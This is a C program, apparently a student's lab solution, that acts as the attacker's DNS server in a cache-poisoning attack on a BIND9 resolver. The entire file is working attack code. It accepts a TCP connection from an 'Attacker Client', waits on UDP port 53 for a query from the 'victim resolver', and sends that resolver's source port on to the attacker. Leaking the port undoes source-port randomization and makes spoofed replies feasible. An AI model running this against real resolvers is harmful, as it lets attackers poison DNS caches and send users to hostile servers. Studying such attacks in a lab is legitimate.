#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define RESOLVER_PORT 53
#define CLIENT_PORT 6666
#define BUFFER_SIZE 1024

int main() {
    int opt = 1;
    // Create TCP socket to communicate with our own client
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        exit(EXIT_FAILURE);
    }

    // same code pattern as in the exercise pdf
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(server_sock);
        exit(EXIT_FAILURE);
    }
    opt = 1;
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Configure client address structure for TCP binding
    struct sockaddr_in client_addr;
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind the TCP socket
    if (bind(server_sock, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Start listening for incoming TCP connections
    if (listen(server_sock, 1) < 0) {
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Accept the connection from the Attacker Client
    struct sockaddr_in active_client_info;
    socklen_t client_len = sizeof(active_client_info);
    int client_sock = accept(server_sock, (struct sockaddr *)&active_client_info, &client_len);
    if (client_sock < 0) {
        close(server_sock);
        exit(EXIT_FAILURE);
    }


    // Create UDP socket to receive the DNS query from the victim resolver
    int dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (dns_sock < 0) {
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // same code pattern as in the exercise pdf
    opt = 1;
    if (setsockopt(dns_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(dns_sock);
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }
    opt = 1;
    if (setsockopt(dns_sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(dns_sock);
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Configure address structure for UDP binding (Port 53)
    struct sockaddr_in dns_addr;
    memset(&dns_addr, 0, sizeof(dns_addr));
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(RESOLVER_PORT);
    dns_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind the UDP socket
    if (bind(dns_sock, (struct sockaddr *)&dns_addr, sizeof(dns_addr)) < 0) {
        close(dns_sock);
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in resolver_addr;
    socklen_t resolver_len = sizeof(resolver_addr);

    // Block until a DNS packet is received.
    ssize_t recv_len = recvfrom(dns_sock, buffer, BUFFER_SIZE, 0,
                         (struct sockaddr *)&resolver_addr, &resolver_len);

    if (recv_len < 0) {
        close(dns_sock);
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }
        // Extract the source port from the BIND9 query.
        uint16_t leaked_port_net = resolver_addr.sin_port;
        // Send the leaked port to our client via the established TCP connection.
        if (send(client_sock, &leaked_port_net, sizeof(leaked_port_net), 0) < 0) {
            close(dns_sock);
            close(client_sock);
            close(server_sock);
            exit(EXIT_FAILURE);
        }
    // Cleanup and close all sockets
    close(dns_sock);
    close(client_sock);
    close(server_sock);

    return 0;
}